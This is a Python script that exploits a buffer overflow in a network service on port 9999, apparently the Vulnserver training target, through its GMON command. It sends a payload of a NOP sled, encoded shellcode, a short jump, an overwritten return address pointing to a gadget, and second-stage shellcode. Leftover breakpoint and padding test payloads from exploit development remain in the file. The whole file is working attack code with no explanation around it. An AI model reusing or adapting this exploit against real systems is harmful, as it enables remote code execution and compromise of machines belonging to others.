#!/usr/bin/python
import socket
server = '10.121.0.24' 
sport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

print 



buf =  ""
buf += "\xdd\xc1\xb8\x10\xcd\x77\x20\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x61\x83\xc3\x04\x31\x43\x16\x03\x43\x16\xe2"
buf += "\xe5\x77\x15\x0f\x04\x5c\x01\x9b\xdf\x28\x92\xd0\x87"
buf += "\xe1\x13\xa9\x6c\x81\x4c\x36\xa3\xd5\x82\xc4\xf1\xf4"
buf += "\x79\xeb\x9c\x1b\x20\x0a\x18\x8e\xea\xf2\x88\x19\xcc"
buf += "\x7f\x2f\xfb\x56\x18\x01\x13\xa4\xe3\x6a\xc0\xda\x91"
buf += "\x58\x0c\x7d\x84\xf9\xc6\x50\x39\x0f\x7d\x65\x4e\xfd"
buf += "\xa8\xb1\xa7\x2f\xe3\x4c\x12\xa1\x36\xc0\x53\x40\x70"
buf += "\x50\x9a\x4f\x0e\x71\xdc\x5f\x9a\xc6\xd6\xe0\xb9\x97"
buf += "\x38\xd5\xbe\xd9\x23\x2b\x17\x49\x71\x25\xe7\xc8\xc9"
buf += "\x28\xcb\xa2\x70\x74\xf6\x3e\xc4\xab\xc5\x77\xa8\xf0"
buf += "\x6e\x58\x6e\xb0\x4a\x69\x1b\x46\x8d\xf0\xac\xcc\x13"
buf += "\xce\x1e\x93\x73\x33\x0b\x56\xd8\xa6\xda\xa1\x60\x0f"
buf += "\x49\x8b\xf1\xf6\x97\x69\x92\x83\x3e\xef\xf2\x48\xe7"
buf += "\x64\x6c\x90\x56\xe4\xe0\xc6\x65\x61\xa7\x14\x91\xcd"
buf += "\x9c\x2d\x48\xdf\x9e\x2e\xbe\xa0\x40\x70\x98\xb2\x2c"
buf += "\x8d\xf9\xe4\x68\x75\xc2\xe6\x0f\xfa\x28\x34\x6b\xc8"
buf += "\x54\x5e\x95\x2e\xc3\x06\xb2\x30\x85\xb0\x28\x8d\x2b"
buf += "\x3f\xa6\x19\x71\x8c\x16\x5a\x71\x4f\x17\xed\x12\xb9"
buf += "\xc3\x85\x2e\x05\x16\x86\x6d\xbb\xbb\x1e\x31\x5b\xba"
buf += "\x8a\xe9\x88\xa0\x67\x48\x52\x61\x13\x59\xef\x83\xa6"
buf += "\x1e\x09\x82\x46\xe6\xe2\x40\x69\x3e\xae\x52\xf9\x43"
buf += "\x93\x34\xd0\xd1\x56\x3f\x20\x20\x97\xef\xfd\x46\x94"
buf += "\x6a\x5a\x7d\x69\x54\x5b\x3f\xf6\x11\x8f\xfa\x4f\xae"
buf += "\x4c\x0e\xc6\xae\x0b\x31\xec\x07\xbb\x81\x87\x42\x1a"
buf += "\xd7\x6f\x36\xb0\x24\x02\xc1\x71\xf0\x48\xed\xb1\x29"
buf += "\x77\x06\x2b\x7b\x8e\x08\xec\xbb\x3f\x2b\x3f\xe5\x2d"
buf += "\xd4\xb5\x60\x54\x8f\x86\x1d\x29\x48\x11\xf9\xa4\x1d"
buf += "\xf7\xb9\xc5\xdd\xce\xba\xdc\x22\x53\xa9\x56\xab\x88"
buf += "\xaa\xc4\x07\xd5\xad\xc6\x8a\x50\x48\x2d\xde\xf8\x4c"
buf += "\x0b\x1f\x56\xa7\x69\xfa\xf9\x8e\xb4\x03\xdb\xb3\x3f"
buf += "\x17\x0f\xeb\xe1\xcf\xd8\xda\x62\xf8\xb6\xe8"



jmp = "\xEB\x0F\x90\x90"; # JMP 0F, NOP, NOP
secondstage= "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF";


eip = '\xf9\x11\x50\x62'
eip2 = '\xbd\x11\x50\x62'
eip3 = "\xb4\x10\x50\x62" #rop gadget
eipbuff='\x00\xF2\x88\x00'


payload = "GMON /" + "\x90" * 3084 +buf+jmp+ "\xb4\x10\x50\x62"+secondstage
payload +="\x90"*(4000 - len(payload))


payload2 = "GMON /" + "\xCC" *3502 +"\xb4\x10\x50\x62"
payload2 +="\x90"*(4000 - len(payload))


buffer = "GMON /.:/" + "A" * 3499 + "\x31\x31\x31\x31" + "C" * (5050 - 3499 - 4)
command="GMON /" + "\xCC" * 3502 + '\x31\x31\x31\x31' + "C" * (5050 - 350 - 4)
command2="GMON /" + "\xCC" * 3502 + "\x00\xf2\x88\x00" + "C" * (5050 - 3501 - 4)
#command="GMON /" + "\xCC" * 3502 + eip + "C" * (5050 - 3501 - 4)
#s.send((cmd + ' ' + "A"*3534+"1111" + '\r\n'))
s.send(payload)
#s.send((cmd + ' ' + pattern + '\r\n'))
print s.recv(1024)

s.send('EXIT\r\n')
print s.recv(1024)
s.close()
